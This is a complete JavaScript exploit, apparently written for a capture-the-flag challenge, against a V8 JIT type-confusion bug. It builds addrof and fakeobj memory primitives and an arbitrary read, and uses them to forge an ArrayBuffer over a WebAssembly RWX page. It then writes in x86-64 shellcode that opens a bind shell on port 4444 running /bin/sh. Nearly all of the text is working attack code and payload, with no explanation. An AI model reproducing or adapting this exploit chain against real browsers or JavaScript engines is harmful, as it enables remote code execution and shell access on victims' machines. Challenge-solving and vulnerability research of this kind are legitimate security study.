// Original goal was to have the bug only triggerable via callback (thus my first two primitives), but I didn't like the ways I found to implement that

var buf = new ArrayBuffer(64);
var f64_buf = new Float64Array(buf);
var u64_buf = new BigUint64Array(buf);
var u8_buf = new Uint8Array(buf);

function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); } }

function ftoi(val) {
  f64_buf[0] = val;
  return u64_buf[0];
}

function itof(val) {
  u64_buf[0] = val;
  return f64_buf[0];
}

function hex(n) {
    return '0x' + n.toString(16);
};

function failPrint(s){
    print("Failed ", s);
    throw "Failed " + s;
}

function assert(condition){
    if(!condition){
        var stack = new Error().stack
        failPrint(stack);
    }
}

function createArray(len, item){
    res = [item];
    for(let i = 1; i < len; i++){
        res[i] = item;
    }
    return res;
}

//var dp = (a) => %DebugPrint(a);

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,138,128,128,128,0,2,96,1,127,1,127,96,0,1,127,3,132,128,128,128,0,3,0,0,1,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,163,128,128,128,0,4,6,109,101,109,111,114,121,2,0,3,98,97,114,0,0,9,102,111,111,98,97,114,98,97,122,0,1,4,109,97,105,110,0,2,10,168,128,128,128,0,3,138,128,128,128,0,0,32,0,32,0,108,32,0,106,11,138,128,128,128,0,0,32,0,32,0,108,32,0,106,11,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;



function foo(arr, cb, i) {
    temp = arr[0];
    cb();
    return arr[i];
}

function compile_foo() {
    x = Array(23).fill(1.2);
    for (var i = 0; i < 0x40000; i++) {
        foo(x,function(){}, i % 10);
    }
}
  

function addrof(obj) {
    x = Array(23).fill(1.2);
    let res = foo(x, function() {
        x[10] = obj;
    }, 5);
    return ftoi(res) & 0xffffffffn;
}

function bar(arr, cb, val){
    cb();
    arr[1] = val;
}

function compile_bar() {
    for (var i = 0; i < 100000; i++) {
        var o = bar(y, function(){}, 1.2 + i);
    }
}


function fakeobj(addr){
    if(addr % 2n != 1n){
        throw "Non-odd address in fakeobj"
    }
    y = [1.2,1.2,1.2,1.2,1.2,1.2];
    bar(y, function(){
        y[0] = {};
    }, itof(addr));
    return y[2];
}

function buildBasicZap(){
    return {
        a:1,
        b:1,
        c:{
            d:1.2
        }
    };
}

function zap(o){
    zap_thing = o.b;;
    return o.c.d;
}

function compile_zap(){
    for (let i = 0; i < 100000; i++) {
        let o = zap({a:1.2, b:1.2, c:{d:1.2}});
    }
}


function basic_read(addr){
    let tempAddr = addr + 1n;
    let fakeAddr = tempAddr - 4n || tempAddr << 32n;
    let obj = {
        aa:1,
        bb:1,
        q:{
            z:fakeobj(fakeAddr)
        }
    }
    let res = zap(obj);
    return ftoi(res);
}

var x = Array(23).fill(1.2);

compile_foo();
foo(x, function(){}, 1);
compile_foo();
foo(x, function(){}, 1);

var leakme = {a:1};

var leakme_addr = addrof(leakme);
print("Leakme addr", hex(leakme_addr));
assert(leakme_addr != 0x33333333);

var y = [1.2,1.2,1.2,1.2,1.2,1.2];
print("running compile bar");
compile_bar();
bar(y, function(){}, 1.2);
compile_bar();
print("Trying fake");

var fakeVal = leakme_addr | leakme_addr << 32n;
var foo2 = fakeobj(fakeVal);
assert(foo2 == leakme);

compile_zap();
zap({a:1.2, b:1.2, c:{d:1.2}});
compile_zap();

print(hex(basic_read(leakme_addr + 11n)));

var array_buff = new ArrayBuffer(256); 
var array_buff_addr = addrof(array_buff) - 1n;
print("Array buff at ", hex(array_buff_addr));

var ArrayBuffMap = basic_read(array_buff_addr) & 0xffffffffn;
print("Array buffer map", hex(ArrayBuffMap));
var wasm_inst_addr = addrof(wasm_instance) - 1n;
print("Wasm instance at ", hex(wasm_inst_addr));
var targ_addr = wasm_inst_addr + 0x68n;
var wrx_page_addr = basic_read(targ_addr);
print("WRX Page", hex(wrx_page_addr));

// Build a fake ArrayBuffer in the contents of this float array
var fakeArrayBuff = [
        itof(ArrayBuffMap | ArrayBuffMap << 32n),
        itof(ArrayBuffMap | 0x1000n << 32n),
        itof((wrx_page_addr & 0xffffffffn) << 32n),
        itof(wrx_page_addr >> 32n),
    ];

var fakeAddr = addrof(fakeArrayBuff) + 7n;

let tempAddr = basic_read(fakeAddr) & 0xffffffffn;
print("Backing of our fake array is at ", hex(tempAddr));

//fakeArrBuff now points to our wrx page
let fakeArrBuff = fakeobj(tempAddr + 8n);
var u8_win_buff = new Uint8Array(fakeArrBuff);

var shellcode = [0x31,0xc0,0x31,0xdb,0x31,0xd2,0xb0,0x01,0x89,0xc6,0xfe,0xc0,0x89,0xc7,0xb2,0x06,0xb0,0x29,0x0f,0x05,0x93,0x48,0x31,0xc0,0x50,0x68,0x02,0x01,0x11,0x5c,0x88,0x44,0x24,0x01,0x48,0x89,0xe6,0xb2,0x10,0x89,0xdf,0xb0,0x31,0x0f,0x05,0xb0,0x05,0x89,0xc6,0x89,0xdf,0xb0,0x32,0x0f,0x05,0x31,0xd2,0x31,0xf6,0x89,0xdf,0xb0,0x2b,0x0f,0x05,0x89,0xc7,0x48,0x31,0xc0,0x89,0xc6,0xb0,0x21,0x0f,0x05,0xfe,0xc0,0x89,0xc6,0xb0,0x21,0x0f,0x05,0xfe,0xc0,0x89,0xc6,0xb0,0x21,0x0f,0x05,0x48,0x31,0xd2,0x48,0xbb,0xff,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x48,0xc1,0xeb,0x08,0x53,0x48,0x89,0xe7,0x48,0x31,0xc0,0x50,0x57,0x48,0x89,0xe6,0xb0,0x3b,0x0f,0x05,0x50,0x5f,0xb0,0x3c,0x0f,0x05];

for(let i = 0; i < 0x20; i++) {
    shellcode.unshift(0x90);
    shellcode.push(0x90);
}

for(let i = 0; i < shellcode.length; i++){
    u8_win_buff[i] = shellcode[i];
}

print("Done");
//Breakpoint();
f();
